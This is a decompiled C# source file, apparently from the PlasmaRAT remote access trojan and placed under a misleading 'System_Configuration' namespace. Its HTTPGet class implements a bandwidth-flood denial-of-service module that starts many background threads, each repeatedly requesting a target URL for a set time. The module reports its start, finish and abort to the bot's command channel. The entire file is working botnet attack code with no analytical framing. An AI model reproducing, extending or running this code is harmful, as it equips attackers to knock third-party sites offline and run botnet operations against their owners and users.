using System;
using System.Diagnostics;
using System.Net;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace System_Configuration
{
	// Token: 0x02000006 RID: 6
	[StandardModule]
	public sealed class HTTPGet
	{
		// Token: 0x0600000F RID: 15 RVA: 0x00002EB0 File Offset: 0x000010B0
		public static void StartBandwidthFlood(string Host, int Threadsto, int Time)
		{
			if (!HTTPGet.AttackRunning)
			{
				HTTPGet.AttackRunning = true;
				HTTPGet.HostToAttack = Host;
				HTTPGet.ThreadstoUse = Threadsto;
				HTTPGet.TimetoAttack = Time;
				HTTPGet.Threads = new Thread[Threadsto - 1 + 1];
				PlasmaRAT.TalktoChannel("Bandwidth Flood on " + HTTPGet.HostToAttack + " started!", "");
				int num = 0;
				int num2 = Threadsto - 1;
				for (int i = num; i <= num2; i++)
				{
					HTTPGet.Threads[i] = new Thread(new ThreadStart(HTTPGet.DoWork));
					HTTPGet.Threads[i].IsBackground = true;
					HTTPGet.Threads[i].Start();
				}
			}
			else
			{
				PlasmaRAT.TalktoChannel("A Bandwidth Flood Attack is Already Running on " + HTTPGet.HostToAttack, "");
			}
		}

		// Token: 0x06000010 RID: 16 RVA: 0x00002F74 File Offset: 0x00001174
		private static void lol()
		{
			HTTPGet.ThreadsEnded = Operators.AddObject(HTTPGet.ThreadsEnded, 1);
			if (Operators.ConditionalCompareObjectEqual(HTTPGet.ThreadsEnded, HTTPGet.ThreadstoUse, false))
			{
				HTTPGet.ThreadsEnded = 0;
				HTTPGet.ThreadstoUse = 0;
				HTTPGet.AttackRunning = false;
				PlasmaRAT.TalktoChannel(string.Concat(new string[]
				{
					"Bandwidth Flood on ",
					HTTPGet.HostToAttack,
					" finished successfully, downloading the file ",
					HTTPGet.attacks.ToString(),
					" times."
				}), "");
				HTTPGet.attacks = 0;
			}
		}

		// Token: 0x06000011 RID: 17 RVA: 0x00003024 File Offset: 0x00001224
		public static void StopBandwidthFlood()
		{
			if (HTTPGet.AttackRunning)
			{
				int num = 0;
				int num2 = HTTPGet.ThreadstoUse - 1;
				for (int i = num; i <= num2; i++)
				{
					try
					{
						HTTPGet.Threads[i].Abort();
					}
					catch (Exception ex)
					{
					}
				}
				HTTPGet.AttackRunning = false;
				PlasmaRAT.TalktoChannel(string.Concat(new string[]
				{
					"Bandwidth Flood on ",
					HTTPGet.HostToAttack,
					" aborted successfully, downloading the file ",
					HTTPGet.attacks.ToString(),
					" times."
				}), "");
				HTTPGet.attacks = 0;
			}
			else
			{
				PlasmaRAT.TalktoChannel("No Bandwidth Flood Attack is Running!", "");
			}
		}

		// Token: 0x06000012 RID: 18 RVA: 0x000030F4 File Offset: 0x000012F4
		private static void DoWork()
		{
			try
			{
				WebClient webClient = new WebClient();
				TimeSpan t = TimeSpan.FromSeconds((double)HTTPGet.TimetoAttack);
				Stopwatch stopwatch = Stopwatch.StartNew();
				while (stopwatch.Elapsed < t)
				{
					try
					{
						webClient.DownloadString(HTTPGet.HostToAttack);
						HTTPGet.attacks++;
						webClient.Dispose();
					}
					catch (Exception ex)
					{
					}
				}
			}
			catch (Exception ex2)
			{
			}
			HTTPGet.lol();
		}

		// Token: 0x0400000E RID: 14
		private static object ThreadsEnded = 0;

		// Token: 0x0400000F RID: 15
		private static string HostToAttack;

		// Token: 0x04000010 RID: 16
		private static int TimetoAttack;

		// Token: 0x04000011 RID: 17
		private static int ThreadstoUse;

		// Token: 0x04000012 RID: 18
		private static Thread[] Threads;

		// Token: 0x04000013 RID: 19
		private static bool AttackRunning = false;

		// Token: 0x04000014 RID: 20
		private static int attacks = 0;
	}
}
